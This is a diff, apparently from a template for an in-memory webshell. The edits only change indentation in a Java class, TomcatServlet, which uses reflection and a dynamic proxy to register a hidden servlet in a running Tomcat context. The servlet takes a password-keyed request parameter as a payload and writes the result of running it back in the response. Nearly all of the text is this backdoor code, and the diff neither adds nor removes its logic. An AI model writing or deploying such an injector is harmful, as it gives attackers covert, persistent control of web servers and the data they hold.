@@ -12,11 +12,11 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
     private void hook(Object servletRequest, Object servletResponse)
             throws Exception {{
         String payload = (String) invokeMethod(
-                servletRequest, "getParameter", password
+            servletRequest, "getParameter", password
         );
         invokeMethod(
-                invokeMethod(servletResponse, "getWriter"),
-                "write", stub(payload, servletRequest, servletResponse)
+            invokeMethod(servletResponse, "getWriter"),
+            "write", stub(payload, servletRequest, servletResponse)
         );
     }}
 
@@ -40,11 +40,11 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
         invokeMethod(wrapper, "setLoadOnStartupString", "1");
         getField(wrapper, "instance").set(wrapper, proxyObject);
         invokeMethod(
-                wrapper, "setServletClass", proxyObject.getClass().getName()
+            wrapper, "setServletClass", proxyObject.getClass().getName()
         );
         getMethodX(context.getClass(), "addChild", 1).invoke(context, wrapper);
         getMethodX(context.getClass(), "addServletMappingDecoded", 3)
-                .invoke(context, pattern, name, false);
+            .invoke(context, pattern, name, false);
     }}
 
     public TomcatServlet() {{
@@ -52,19 +52,19 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
             Class servletClass = null;
             try {{
                 servletClass = Class.forName(
-                        "javax.servlet.Servlet"
+                    "javax.servlet.Servlet"
                 );
             }} catch (ClassNotFoundException e) {{
                 try {{
                     servletClass = Class.forName(
-                            "jakarta.servlet.Servlet"
+                        "jakarta.servlet.Servlet"
                     );
                 }} catch (ClassNotFoundException ex) {{}}
             }}
 
             if (servletClass != null) {{
                 Object proxyObject = Proxy.newProxyInstance(
-                        getLoader(), new Class[]{{servletClass}}, this
+                    getLoader(), new Class[]{{servletClass}}, this
                 );
                 try {{
                     addSevlet(proxyObject);
